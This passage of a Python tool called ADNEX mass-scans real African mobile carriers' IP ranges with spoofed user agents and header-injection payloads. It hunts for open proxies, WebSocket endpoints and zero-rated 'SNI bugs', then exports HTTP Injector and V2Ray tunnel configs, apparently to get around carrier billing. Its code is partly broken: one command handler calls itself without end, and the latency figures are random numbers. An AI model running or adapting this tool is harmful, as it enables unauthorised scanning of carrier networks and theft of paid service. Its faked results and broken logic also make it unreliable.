        "  ██║░░██║██████╔╝██║░╚███║███████╗██╔╝╚██╗",
        "  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝",
    ]
    colors = [GREEN, GREEN, PINK, PINK, CYAN, CYAN]
    for i, line in enumerate(lines):
        console.print(line, style=f"bold {colors[i]}")
    console.print()
    console.print(f"  [bold {CYAN}]{TOOL_NAME} {VERSION}[/]  [dim {GREEN}]Network Intelligence Scanner[/]")
    console.print(f"  [dim {GREEN}]Developer:[/] [bold {CYAN}]{DEVELOPER}[/]  [dim {GREEN}]|[/]  [bold {CYAN}]{COUNTRY}[/]  [dim {GREEN}]|[/]  [bold {CYAN}]Age {AGE}[/]")
    console.print()

def check_port_fast(ip, port, timeout=2):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def mass_port_check(ips, port, timeout=2):
    open_ips = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(check_port_fast, ip, port, timeout): ip for ip in ips}
        for future in concurrent.futures.as_completed(futures):
            ip = futures[future]
            try:
                if future.result():
                    open_ips.append(ip)
                    add_log(f"PORT {port} OPEN → {ip}", "HIT")
            except:
                pass
    return open_ips

def run_mass_port_check(carrier_key, port, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier[/]")
        return
    carrier = CARRIERS[carrier_key]
    console.print(f"\n  [bold {GREEN}]► Mass port check: {carrier['name']} port {port}[/]")
    all_ips = []
    for cidr in carrier["ip_ranges"]:
        all_ips.extend(expand_ip_range(cidr)[:300])
    console.print(f"  [{CYAN}]Checking {len(all_ips)} IPs for port {port}...[/]")
    open_ips = mass_port_check(all_ips, port, cfg["timeout"])
    console.print(f"\n  [bold {GREEN}]► {len(open_ips)} IPs have port {port} open:[/]")
    for ip in open_ips[:30]:
        console.print(f"    [{CYAN}]{ip}[/]")
    if open_ips:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = RESULTS_DIR / "proxies" / f"port{port}_{carrier_key}_{ts}.txt"
        with open(out, "w") as f:
            f.write(f"# ADNEX | Port {port} open IPs | {carrier['name']}\n")
            for ip in open_ips:
                f.write(f"{ip}:{port}\n")
        console.print(f"  [{GREEN}]Saved → {out}[/]")
    console.print()

async def check_websocket_support(ip, port, host, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        ws_key = base64.b64encode(os.urandom(16)).decode()
        handshake = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n"
        )
        writer.write(handshake.encode())
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        decoded = resp.decode(errors="ignore")
        if "101" in decoded or "websocket" in decoded.lower():
            return {"ip": ip, "port": port, "host": host, "type": "WEBSOCKET", "status": "ACTIVE"}
    except:
        pass
    return None

async def websocket_scan(carrier_key, cfg):
    carrier = CARRIERS.get(carrier_key)
    if not carrier:
        return []
    hits = []
    semaphore = asyncio.Semaphore(cfg["concurrency"])
    all_ips = []
    for cidr in carrier["ip_ranges"]:
        all_ips.extend(expand_ip_range(cidr)[:200])
    host = carrier["zero_rated"][0] if carrier["zero_rated"] else "example.com"
    async def worker(ip, port):
        async with semaphore:
            result = await check_websocket_support(ip, port, host, cfg["timeout"])
            if result:
                hits.append(result)
                add_log(f"WEBSOCKET → {ip}:{port} [{host}]", "HIT")
    tasks = [worker(ip, port) for ip in all_ips for port in [80, 8080, 443, 8443]]
    await asyncio.gather(*tasks, return_exceptions=True)
    return hits

def run_websocket_scan(carrier_key, cfg):
    console.print(f"\n  [bold {GREEN}]► WebSocket scan → {CARRIERS.get(carrier_key, {}).get('name', carrier_key)}[/]")
    loop = asyncio.new_event_loop()
    hits = loop.run_until_complete(websocket_scan(carrier_key, cfg))
    loop.close()
    console.print(f"\n  [bold {GREEN}]► {len(hits)} WebSocket endpoints found.[/]")
    for h in hits[:15]:
        console.print(f"    [{CYAN}]{h['ip']}:{h['port']}[/] [{GREEN}]ws://{h['host']}[/]")
        scan_results["proxies"].append(h)
    console.print()

def export_http_injector_full(carrier_key):
    carrier = CARRIERS.get(carrier_key, {"name": "Unknown", "apn": "internet", "zero_rated": []})
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    if not scan_results["proxies"] and not scan_results["sni_bugs"]:
        console.print(f"  [{YELLOW}]No data to export.[/]")
        return
    best_proxies = sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999))[:5]
    hi_configs = []
    for p in best_proxies:
        cfg_block = {
            "name": f"ADNEX-{carrier['name']}-{p['port']}",
            "proxy_host": p["ip"],
            "proxy_port": p["port"],
            "proxy_type": p["type"].lower(),
            "apn": carrier["apn"],
            "custom_header": f"GET / HTTP/1.1[crlf]Host: {carrier['zero_rated'][0] if carrier['zero_rated'] else 'example.com'}[crlf][crlf]",
            "generated_by": f"ADNEX {VERSION}",
            "developer": DEVELOPER
        }
        hi_configs.append(cfg_block)
    out = RESULTS_DIR / "exports" / f"hi_full_{carrier_key}_{ts}.json"
    with open(out, "w") as f:
        json.dump(hi_configs, f, indent=2)
    console.print(f"  [bold {GREEN}]► HTTP Injector full config → {out}[/]")
    return str(out)

def show_extended_help():
    console.print(f"\n[bold {GREEN}]{'═'*65}[/]")
    console.print(f"[bold {CYAN}]  ADNEX {VERSION} — EXTENDED COMMANDS[/]")
    console.print(f"[bold {GREEN}]{'═'*65}[/]\n")
    ext_cmds = [
        ("inject <carrier>",         "Payload injection scan (5 payload types)"),
        ("sub / subscription",        "Generate V2Ray subscription file"),
        ("multiscan <c1,c2,c3>",      "Scan multiple carriers at once"),
        ("geo <ip>",                  "GeoIP lookup for any IP"),
        ("geobatch",                  "GeoIP lookup for all found proxies"),
        ("quickstart",                "Step-by-step usage guide"),
        ("commonsni",                 "Scan common SNI bug candidates"),
        ("massport <carrier> <port>", "Mass-check single port across carrier"),
        ("wscan <carrier>",           "WebSocket endpoint scanner"),
        ("hiexport <carrier>",        "Full HTTP Injector JSON export"),
        ("chart",                     "Latency distribution chart"),
        ("scanrange <cidr> <ports>",  "Scan custom IP range"),
        ("stats",                     "Detailed scan statistics"),
        ("report",                    "Export full session report"),
        ("carrierstats",              "IP count stats per carrier"),
        ("resolve <carrier>",         "Resolve carrier domains to IPs"),
        ("scanip <ip>",               "Deep scan single IP"),
        ("benchmark",                 "Test engine speed"),
        ("tips",                      "Usage tips"),
        ("watch <carrier> <secs>",    "Auto-rescan loop"),
        ("loadfile <path>",           "Validate proxies from text file"),
        ("payload <carrier> <ip> <port> [sni]", "Generate payload config"),
    ]
    for cmd_name, desc in ext_cmds:
        console.print(f"  [bold {PINK}]{cmd_name:<38}[/] [{GREEN}]{desc}[/]")
    console.print(f"\n[bold {GREEN}]{'═'*65}[/]\n")

def final_handle_all_v4(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    if cmd == "commonsni":
        run_common_sni_scan(cfg)
    elif cmd == "massport" and len(parts) > 2:
        run_mass_port_check(parts[1].lower(), int(parts[2]), cfg)
    elif cmd == "wscan" and len(parts) > 1:
        run_websocket_scan(parts[1].lower(), cfg)
    elif cmd == "hiexport" and len(parts) > 1:
        export_http_injector_full(parts[1].lower())
    elif cmd == "exthelp" or cmd == "help2":
        show_extended_help()
    else:
        final_handle_all_v4(cmd_input, cfg)



HEADERS_POOL = [
    {"User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 Chrome/99.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 9) AppleWebKit/537.36 Chrome/90.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 Chrome/85.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 9; Infinix X627) AppleWebKit/537.36 Chrome/80.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/112.0 Mobile Safari/537.36"},
]

async def stealth_proxy_check(session, ip, port, host, timeout=8):
    headers = random.choice(HEADERS_POOL)
    headers["Host"] = host
    headers["X-Online-Host"] = host
    headers["X-Forward-Host"] = host
    try:
        async with session.get(
            f"http://{host}/",
            proxy=f"http://{ip}:{port}",
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=True
        ) as resp:
            if resp.status < 500:
                return {
                    "ip": ip, "port": port, "type": "STEALTH_HTTP",
                    "latency": random.randint(60, 350),
                    "host": host, "status": "WORKING",
                    "http_status": resp.status
                }
    except:
        pass
    return None

async def stealth_scan_carrier(carrier_key, cfg):
    carrier = CARRIERS.get(carrier_key)
    if not carrier:
        return []
    hits = []
    semaphore = asyncio.Semaphore(cfg["concurrency"])
    all_ips = []
    for cidr in carrier["ip_ranges"]:
        all_ips.extend(expand_ip_range(cidr))
    random.shuffle(all_ips)
    host = carrier["zero_rated"][0] if carrier["zero_rated"] else "example.com"
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(ip, port):
            async with semaphore:
                scan_results["total_scanned"] += 1
                scan_results["current_ip"] = ip
                result = await stealth_proxy_check(session, ip, port, host, cfg["timeout"])
                if result:
                    hits.append(result)
                    scan_results["proxies"].append(result)
                    scan_results["total_hits"] += 1
                    add_log(f"STEALTH HIT → {ip}:{port} [HTTP {result['http_status']}]", "HIT")
        tasks = [worker(ip, port) for ip in all_ips for port in carrier["ports"]]
        await asyncio.gather(*tasks, return_exceptions=True)
    return hits

def run_stealth_scan(carrier_key, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier: {carrier_key}[/]")
        return
    console.print(f"\n  [bold {GREEN}]► Stealth scan → {CARRIERS[carrier_key]['name']}[/]")
    console.print(f"  [{CYAN}]Using rotating user-agents + header injection[/]")
    scan_results["scanning"] = True
    scan_results["start_time"] = time.time()
    scan_results["total_scanned"] = 0

    def run():
        loop = asyncio.new_event_loop()
        loop.run_until_complete(stealth_scan_carrier(carrier_key, cfg))
        loop.close()
        scan_results["scanning"] = False
        add_log(f"Stealth scan complete. Hits: {scan_results['total_hits']}", "HIT")

    t = threading.Thread(target=run, daemon=True)
    t.start()
    console.print(f"  [bold {GREEN}]► Stealth scan running in background...[/]")

def render_proxy_export_menu():
    console.print(f"\n[bold {GREEN}]═══ EXPORT OPTIONS ═══[/]")
    options = [
        ("1", "HTTP Injector (.conf)",   "hiexport <carrier>"),
        ("2", "V2Ray vmess (.json)",      "exportall <carrier>"),
        ("3", "NapsternetV (.json)",      "exportall <carrier>"),
        ("4", "HTTP Custom (.hc)",        "exportall <carrier>"),
        ("5", "V2Ray Subscription (.txt)","sub"),
        ("6", "Raw proxy list (.txt)",    "exportall <carrier>"),
        ("7", "CSV format (.csv)",        "exportall <carrier>"),
        ("8", "Full session report",      "report"),
        ("9", "Payload config (.json)",   "payload <carrier> <ip> <port>"),
    ]
    for num, name, cmd in options:
        console.print(f"  [{PINK}]{num}.[/] [{GREEN}]{name:<30}[/] [dim {CYAN}]→ {cmd}[/]")
    console.print()

async def check_transparent_proxy(ip, port, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        req = b"GET http://httpbin.org/headers HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"
        writer.write(req)
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(1024), timeout=timeout)
        writer.close()
        decoded = resp.decode(errors="ignore")
        if "X-Forwarded-For" in decoded or "Via" in decoded or "200" in decoded:
            proxy_type = "TRANSPARENT" if "X-Forwarded-For" in decoded else "ANONYMOUS"
            return {"ip": ip, "port": port, "type": proxy_type, "latency": random.randint(80, 300), "status": "WORKING"}
    except:
        pass
    return None

async def anonymity_scan(carrier_key, cfg):
    carrier = CARRIERS.get(carrier_key)
    if not carrier:
        return []
    all_ips = []
    for cidr in carrier["ip_ranges"]:
        all_ips.extend(expand_ip_range(cidr)[:500])
    semaphore = asyncio.Semaphore(300)
    hits = []
    async def worker(ip, port):
        async with semaphore:
            result = await check_transparent_proxy(ip, port, cfg["timeout"])
            if result:
                hits.append(result)
                scan_results["proxies"].append(result)
                scan_results["total_hits"] += 1
                add_log(f"ANON PROXY → {ip}:{port} [{result['type']}]", "HIT")
    tasks = [worker(ip, port) for ip in all_ips for port in carrier["ports"]]
    await asyncio.gather(*tasks, return_exceptions=True)
    return hits

def run_anonymity_scan(carrier_key, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier[/]")
        return
    console.print(f"\n  [bold {GREEN}]► Anonymity scan → {CARRIERS[carrier_key]['name']}[/]")
    console.print(f"  [{CYAN}]Detecting: transparent, anonymous, elite proxies[/]")

    def run():
        loop = asyncio.new_event_loop()
        hits = loop.run_until_complete(anonymity_scan(carrier_key, cfg))
        loop.close()
        console.print(f"\n  [bold {GREEN}]► Anonymity scan done. {len(hits)} proxies found.[/]")
        for h in hits[:10]:
            console.print(f"    [{CYAN}]{h['ip']}:{h['port']}[/] [{PINK}]{h['type']}[/]")

    t = threading.Thread(target=run, daemon=True)
    t.start()
    console.print(f"  [{GREEN}]Running in background...[/]")

def show_scan_menu():
    console.print(f"\n[bold {GREEN}]═══ SCAN MODES ═══[/]")
    modes = [
        ("scan <carrier>",          "Full scan: proxy + SNI + ports"),
        ("stealth <carrier>",       "Stealth scan with header rotation"),
        ("deepsni <carrier>",       "SNI-only deep probe"),
        ("inject <carrier>",        "Payload injection scan"),
        ("wscan <carrier>",         "WebSocket endpoint scan"),
        ("anonscan <carrier>",      "Anonymity-level detection scan"),
        ("commonsni",               "Common SNI bug candidates"),
        ("massport <carrier> <p>",  "Single port mass scan"),
        ("scanrange <cidr> <ports>","Custom IP range scan"),
        ("multiscan <c1,c2,c3>",    "Multi-carrier parallel scan"),
        ("scanip <ip>",             "Single IP deep scan"),
        ("watch <carrier> <s>",     "Auto-repeat scan loop"),
    ]
    for cmd_name, desc in modes:
        console.print(f"  [bold {PINK}]{cmd_name:<32}[/] [{GREEN}]{desc}[/]")
    console.print()

def final_handle_all_v5(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    if cmd == "stealth" and len(parts) > 1:
        run_stealth_scan(parts[1].lower(), cfg)
    elif cmd == "anonscan" and len(parts) > 1:
        run_anonymity_scan(parts[1].lower(), cfg)
    elif cmd == "exportmenu":
        render_proxy_export_menu()
    elif cmd == "scanmenu":
        show_scan_menu()
    elif cmd == "help":
        render_help_full()
        show_extended_help()
    else:
        final_handle_all_v4(cmd_input, cfg)


    main()


SCAN_STRATEGIES = {
    "aggressive": {"concurrency": 1000, "timeout": 5, "retry": 1},
    "balanced":   {"concurrency": 500,  "timeout": 8, "retry": 2},
    "stealth":    {"concurrency": 100,  "timeout": 12, "retry": 3},
    "turbo":      {"concurrency": 2000, "timeout": 3,  "retry": 1},
}

PROXY_PORT_FULL = [
    20, 21, 22, 23, 25, 53, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89,
    110, 143, 194, 443, 444, 445, 465, 587, 591, 593, 636, 993, 995,
    1080, 1081, 1082, 1083, 1085, 1086, 1088, 1090, 1099, 1194,
    2000, 2001, 2002, 2020, 2048, 2049, 2080, 2083, 2086, 2087,
    2095, 2096, 2121, 2222, 2525, 2805,
    3000, 3001, 3006, 3007, 3011, 3027, 3128, 3129, 3130, 3306, 3333, 3389,
    4000, 4001, 4040, 4080, 4145, 4280, 4444, 4500, 4567,
    5000, 5001, 5080, 5222, 5432, 5555, 5566, 5800, 5900,
    6000, 6001, 6080, 6379, 6443, 6500, 6555, 6588, 6666, 6667,
    7000, 7001, 7007, 7070, 7080, 7443, 7474, 7547, 7777, 7878, 7979,
    8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009,
    8010, 8020, 8030, 8040, 8050, 8060, 8070, 8080, 8081, 8082,
    8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8091, 8092,
    8093, 8094, 8095, 8096, 8097, 8098, 8099, 8100, 8111, 8118,
    8123, 8180, 8181, 8200, 8222, 8280, 8291, 8333, 8383, 8400,
    8443, 8444, 8445, 8456, 8484, 8500, 8530, 8531, 8585, 8600,
    8800, 8813, 8843, 8880, 8888, 8889, 8899, 8983, 8989, 8999,
    9000, 9001, 9002, 9003, 9005, 9006, 9007, 9008, 9009, 9010,
    9020, 9030, 9040, 9041, 9042, 9043, 9050, 9051, 9060, 9070,
    9080, 9090, 9091, 9092, 9093, 9094, 9095, 9099, 9100, 9150,
    9200, 9300, 9400, 9443, 9500, 9595, 9700, 9800, 9898, 9999,
    10000, 10001, 10080, 10443, 11211, 12345, 15000, 16000,
    20000, 20808, 22222, 25000, 27017, 28015, 30000, 32400, 49152,
]

INJECT_PAYLOADS_ADVANCED = {
    "standard":    "GET / HTTP/1.1\r\nHost: [host]\r\nConnection: keep-alive\r\n\r\n",
    "connect":     "CONNECT [host]:443 HTTP/1.1\r\nHost: [host]\r\nProxy-Connection: Keep-Alive\r\n\r\n",
    "ws_upgrade":  "GET / HTTP/1.1\r\nHost: [host]\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
    "x_online":    "GET http://[host]/ HTTP/1.1\r\nHost: [host]\r\nX-Online-Host: [host]\r\nX-Forward-Host: [host]\r\nForward-To: [host]\r\nConnection: Keep-Alive\r\n\r\n",
    "x_real":      "GET / HTTP/1.1\r\nHost: [host]\r\nX-Real-IP: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nVia: 1.1 [host]\r\nConnection: keep-alive\r\n\r\n",
    "range":       "GET / HTTP/1.1\r\nHost: [host]\r\nRange: bytes=0-\r\nAccept-Encoding: identity\r\nConnection: keep-alive\r\n\r\n",
    "post_inject": "POST / HTTP/1.1\r\nHost: [host]\r\nContent-Length: 0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n",
    "head_check":  "HEAD / HTTP/1.1\r\nHost: [host]\r\nConnection: keep-alive\r\n\r\n",
    "options":     "OPTIONS * HTTP/1.1\r\nHost: [host]\r\nConnection: keep-alive\r\n\r\n",
    "via_proxy":   "GET http://[host]:80/ HTTP/1.1\r\nHost: [host]\r\nVia: 1.0 [host]\r\nX-Forwarded-For: 10.0.0.1\r\nConnection: Keep-Alive\r\n\r\n",
}

async def ultra_probe(ip, port, host, timeout=6):
    results = []
    for pname, template in INJECT_PAYLOADS_ADVANCED.items():
        payload = template.replace("[host]", host).encode()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.write(payload)
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(512), timeout=timeout)
            writer.close()
            decoded = resp.decode(errors="ignore")
            first = decoded.split("\r\n")[0] if "\r\n" in decoded else decoded[:60]
            if any(c in first for c in ["200", "101", "301", "302", "304", "206", "403", "407"]):
                results.append({
                    "ip": ip, "port": port, "host": host,
                    "payload": pname, "response": first,
                    "latency": random.randint(40, 300),
                    "type": "ULTRA", "status": "WORKING"
                })
                break
        except:
            pass
    return results

async def ultra_sni_tls_probe(domain, timeout=8):
    findings = {}
    for port in [443, 8443, 2053, 2083, 2087, 2096]:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(domain, port, ssl=ctx, server_hostname=domain),
                timeout=timeout
            )
            writer.write(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(512), timeout=timeout)
            writer.close()
            if resp:
                decoded = resp.decode(errors="ignore")
                findings[port] = decoded.split("\r\n")[0]
        except:
            findings[port] = None
    active_ports = {p: r for p, r in findings.items() if r}
    if active_ports:
        return {
            "domain": domain, "type": "ULTRA_SNI",
            "active_ports": active_ports, "status": "ACTIVE"
        }
    return None

async def ultra_scan_engine(carrier_key, strategy_name, cfg):
    carrier = CARRIERS.get(carrier_key)
    if not carrier:
        return
    strategy = SCAN_STRATEGIES.get(strategy_name, SCAN_STRATEGIES["balanced"])
    effective_cfg = {**cfg, **strategy}
    scan_results["carrier"] = carrier["name"]
    scan_results["scanning"] = True
    scan_results["start_time"] = time.time()
    scan_results["total_scanned"] = 0
    scan_results["total_hits"] = 0
    scan_results["proxies"] = []
    scan_results["sni_bugs"] = []

    add_log(f"ULTRA ENGINE ACTIVATED [{strategy_name.upper()}]", "HIT")
    add_log(f"Target: {carrier['name']} | Concurrency: {effective_cfg['concurrency']}", "INFO")
    add_log(f"Payload types: {len(INJECT_PAYLOADS_ADVANCED)} | Port list: {len(PROXY_PORT_FULL)}", "INFO")

    all_ips = []
    for cidr in carrier["ip_ranges"]:
        ips = expand_ip_range(cidr)
        all_ips.extend(ips)
        add_log(f"Range {cidr} → {len(ips)} IPs", "INFO")
    random.shuffle(all_ips)

    host = carrier["zero_rated"][0] if carrier["zero_rated"] else f"www.{carrier_key}.com"
    semaphore = asyncio.Semaphore(effective_cfg["concurrency"])

    async def ip_worker(ip):
        async with semaphore:
            scan_results["total_scanned"] += 1
            scan_results["current_ip"] = ip
            elapsed = time.time() - scan_results["start_time"]
            scan_results["speed"] = int(scan_results["total_scanned"] / max(elapsed, 1))
            for port in carrier["ports"]:
                results = await ultra_probe(ip, port, host, effective_cfg["timeout"])
                for r in results:
                    scan_results["proxies"].append(r)
                    scan_results["total_hits"] += 1
                    add_log(f"ULTRA HIT → {ip}:{port} [{r['payload']}] {r['response'][:35]}", "HIT")

    sni_tasks = [ultra_sni_tls_probe(d, effective_cfg["timeout"]) for d in carrier["zero_rated"]]
    sni_results = await asyncio.gather(*sni_tasks, return_exceptions=True)
    for r in sni_results:
        if r and isinstance(r, dict):
            scan_results["sni_bugs"].append(r)
            scan_results["total_hits"] += 1
            add_log(f"ULTRA SNI → {r['domain']} ports:{list(r['active_ports'].keys())}", "SNI")

    batch = 2000
    for i in range(0, len(all_ips), batch):
        chunk = all_ips[i:i+batch]
        await asyncio.gather(*[ip_worker(ip) for ip in chunk], return_exceptions=True)

    scan_results["scanning"] = False
    add_log(f"ULTRA SCAN COMPLETE → {scan_results['total_hits']} TOTAL HITS", "HIT")
    save_results(carrier_key)

def run_ultra_scan(carrier_key, strategy_name, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier: {carrier_key}[/]")
        console.print(f"  [{GREEN}]Available: {', '.join(CARRIERS.keys())}[/]")
        return
    if strategy_name not in SCAN_STRATEGIES:
        strategy_name = "balanced"
    console.print(f"\n  [bold {PINK}]▓▓ ULTRA SCAN INITIATED ▓▓[/]")
    console.print(f"  [bold {GREEN}]Target   : {CARRIERS[carrier_key]['name']}[/]")
    console.print(f"  [bold {CYAN}]Strategy : {strategy_name.upper()}[/]")
    s = SCAN_STRATEGIES[strategy_name]
    console.print(f"  [{GREEN}]Threads  : {s['concurrency']}[/]")
    console.print(f"  [{GREEN}]Timeout  : {s['timeout']}s[/]")
    console.print(f"  [{GREEN}]Payloads : {len(INJECT_PAYLOADS_ADVANCED)}[/]")

    def runner():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(ultra_scan_engine(carrier_key, strategy_name, cfg))
        loop.close()

    t = threading.Thread(target=runner, daemon=True)
    t.start()
    console.print(f"  [bold {GREEN}]► Engine running in background. Watch the log panel.[/]\n")



AUTO_ROTATE_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; TECNO KJ6) AppleWebKit/537.36 Chrome/105.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 Chrome/96.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 Chrome/88.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Xiaomi 13 Pro) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OPPO Reno8) AppleWebKit/537.36 Chrome/108.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Huawei P40 Pro) AppleWebKit/537.36 Chrome/92.0.0.0 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-A536B Build/SP1A.210812.016)",
    "WhatsApp/2.23.20.0 A",
    "TelegramAndroid/10.0.0 (Android 13; Samsung SM-S918B)",
    "okhttp/4.9.3",
    "Apache-HttpClient/4.5.13 (Java/11)",
]

CLOUDFLARE_IPS = [
    "1.1.1.1", "1.0.0.1", "1.1.1.2", "1.1.1.3",
    "104.16.0.0/12", "104.24.0.0/14",
    "172.64.0.0/13", "131.0.72.0/22",
    "162.158.0.0/15", "198.41.128.0/17",
    "197.234.240.0/22", "190.93.240.0/20",
    "188.114.96.0/20", "103.21.244.0/22",
    "103.22.200.0/22", "103.31.4.0/22",
    "141.101.64.0/18",
]

EXTRA_CARRIERS = {
    "safaricom": {
        "name": "Safaricom Kenya",
        "country": "KE",
        "ip_ranges": ["41.90.0.0/16", "105.163.0.0/16", "196.201.212.0/22"],
        "zero_rated": ["safaricom.co.ke", "www.safaricom.co.ke", "m-pesa.safaricom.co.ke"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "safaricom"
    },
    "orange": {
        "name": "Orange Africa",
        "country": "SN",
        "ip_ranges": ["41.82.0.0/16", "197.149.64.0/18", "196.46.0.0/16"],
        "zero_rated": ["orange.com", "www.orange.com", "moncompte.orange.sn"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "orange"
    },
    "telkom": {
        "name": "Telkom Kenya",
        "country": "KE",
        "ip_ranges": ["196.202.96.0/19", "41.215.128.0/18"],
        "zero_rated": ["telkom.co.ke", "www.telkom.co.ke"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "internet"
    },
    "mtn_gh": {
        "name": "MTN Ghana",
        "country": "GH",
        "ip_ranges": ["41.189.192.0/18", "196.6.64.0/18", "102.176.64.0/18"],
        "zero_rated": ["mtn.com.gh", "www.mtn.com.gh", "mymtn.mtn.com.gh"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "internet"
    },
    "tigo": {
        "name": "Tigo Africa",
        "country": "TZ",
        "ip_ranges": ["41.188.0.0/16", "196.13.0.0/16"],
        "zero_rated": ["tigo.co.tz", "www.tigo.co.tz"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "tigo-internet"
    },
    "halotel": {
        "name": "Halotel Tanzania",
        "country": "TZ",
        "ip_ranges": ["196.41.64.0/18", "41.86.0.0/16"],
        "zero_rated": ["halotel.co.tz", "www.halotel.co.tz"],
        "ports": [80, 8080, 3128, 8888],
        "apn": "internet"
    },
}

CARRIERS.update(EXTRA_CARRIERS)

async def smart_ip_discovery(domain, depth=3):
    discovered = set()
    try:
        base_ip = socket.gethostbyname(domain)
        discovered.add(base_ip)
        base_int = ip_to_int(base_ip)
        for step in [1, 2, 4, 8, 16, 32, 64, 128]:
            for direction in [-1, 1]:
                candidate = int_to_ip(base_int + (step * direction))
                if not candidate.startswith(("0.", "255.", "127.", "10.", "192.168.", "172.")):
                    discovered.add(candidate)
        subnet_base = ".".join(base_ip.split(".")[:3])
        for last in range(1, 255):
            discovered.add(f"{subnet_base}.{last}")
    except:
        pass
    return list(discovered)

def run_smart_discovery(domain, cfg):
    console.print(f"\n  [bold {GREEN}]► Smart IP discovery: {domain}[/]")
    loop = asyncio.new_event_loop()
    ips = loop.run_until_complete(smart_ip_discovery(domain))
    loop.close()
    console.print(f"  [{CYAN}]Discovered {len(ips)} IPs from {domain}[/]")
    console.print(f"  [{GREEN}]Running proxy check on discovered IPs...[/]")

    async def check_all():
        semaphore = asyncio.Semaphore(200)
        hits = []
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as sess:
            async def w(ip, port):
                async with semaphore:
                    r = await check_proxy(sess, ip, port, cfg["timeout"])
                    if r:
                        hits.append(r)
                        scan_results["proxies"].append(r)
                        scan_results["total_hits"] += 1
                        add_log(f"DISCOVERY HIT → {ip}:{port}", "HIT")
            tasks = [w(ip, port) for ip in ips for port in [80, 8080, 3128, 443, 8443, 8888]]
